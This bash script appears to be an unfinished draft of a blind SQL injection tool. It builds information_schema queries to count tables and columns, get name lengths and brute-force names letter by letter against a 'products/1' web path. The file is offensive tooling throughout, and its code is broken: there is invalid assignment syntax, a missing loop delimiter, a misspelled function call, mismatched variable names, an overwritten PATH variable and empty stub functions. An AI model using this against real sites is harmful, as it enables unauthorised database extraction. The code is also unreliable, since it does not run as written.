#!/bin/bash
# get number of tables inside a database:
# the number will start to count by 1 single table is equal to 1!
# (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '<database>') > 0

# get the number of columns inside a table
# (SELECT COUNT(*) FROM <table>) > 0

# get the length of a column name
# (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema = <table_name>)

# use the length to guess the name of the table

function getLength() {
	echo 'i get you the length'
	# store the length in array!
	# required: ??
	# parameter: ??
	# IT Create from three parameter the sqli!
	sqli="SELECT LENGTH(${column}) FROM ${tableName} WHERE ${condition} LIMIT ? OFFSET ?"
}

function encodeToUrl() {
	echo 'i will encode it to url'
	# it can make some problems! NOT SURE!
	# PROBLEMES can come from the quots
	#echo $(python -c `from urllib.parse import quote; print(quote(\"${1}\"));`)
	
	# will that solve our Problem?
	echo $(echo "$1" | jq -Rr '@uri')
}

function getAmount() {
	echo 'i get the amount of the tables/columns/content'
	# required: 
	# - database
	# - sqli
	# parameter: ??
	tableName='information_schema.tables'
	condition="table_schema = ${database}"
	sqli=(SELECT COUNT(*) FROM ${tableName} WHERE ${condition}) > 0
	
}

function bruteForceName() {
	echo 'i will get the name'
	# required: 
	# - length
	# - count
	# - database/table/columns
	# sqli

	encodeUrl=$(encodeToUrl "${PATH} ${sqli}")

	for index in $(seq 1 $length); do
		for letter in {a..z} do
			rquest $encodedUrl
		done
	done
}

function request() {
	echo 'i will take care of the request and also the validation of the response'
	# rquired
	# - parsed url
}

SQLiTablesCount="SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=${database}"
SQLiColumnsCount="SELECT COUNT(*) FROM ${table}"
SQLILength="SELECT LENGTH(<column>) FROM information_schema.<column> WHERE <table_schema> = <table_name>"

PATH="products/1"
